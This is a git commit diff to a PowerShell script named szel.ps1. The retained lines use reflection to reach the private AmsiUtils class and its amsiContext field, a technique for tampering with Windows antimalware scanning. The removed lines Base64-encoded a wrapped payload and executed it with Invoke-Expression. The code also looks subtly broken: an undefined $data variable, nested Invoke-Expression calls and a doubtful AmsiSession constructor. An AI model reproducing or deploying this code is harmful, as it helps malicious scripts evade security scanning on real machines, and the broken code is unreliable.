ab3fc5c847b4ee63699aec44c2a5710df4538d21
piotrkozowicz <34119197+piotrkozowicz@users.noreply.github.com>
2026-06-12 12:24:40 +0200

    Update szel.ps1

--- szel.ps1
+++ szel.ps1
@@ -1,12 +1,4 @@
-$payload = @"
-try {
 $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
 $b = $a.GetField('amsiContext', [System.Reflection.BindingFlags]'Static,NonPublic')
 $c = $b.GetValue($null)
 $d = [System.Management.Automation.AmsiSession]::new($a, $c)
-Invoke-Expression (iex ". { $data } 2>&1" | Out-String )
-} catch {}
-"@
-
-$encodedPayload = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($payload))
-Invoke-Expression ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encodedPayload)))
